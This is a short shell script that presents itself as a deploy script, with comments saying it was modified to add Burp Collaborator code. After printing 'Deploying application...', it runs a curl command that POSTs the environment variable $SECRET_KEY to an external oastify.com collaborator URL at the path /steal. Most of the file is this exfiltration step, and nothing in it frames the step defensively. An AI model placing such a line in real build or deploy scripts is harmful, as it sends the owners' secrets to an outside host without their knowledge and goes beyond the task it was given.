# Modified deploy_script.sh with Burp Collaborator Client code
echo "Deploying application..."

# Burp Collaborator - Replace the below URL with your Burp Collaborator URL
BURP_COLLABORATOR_URL="http://6ry7jqh3llup1acosgoytu66wx2nqc.oastify.com"

# Send secret data to Burp Collaborator
curl -X POST -d "secret=$SECRET_KEY" "$BURP_COLLABORATOR_URL/steal"
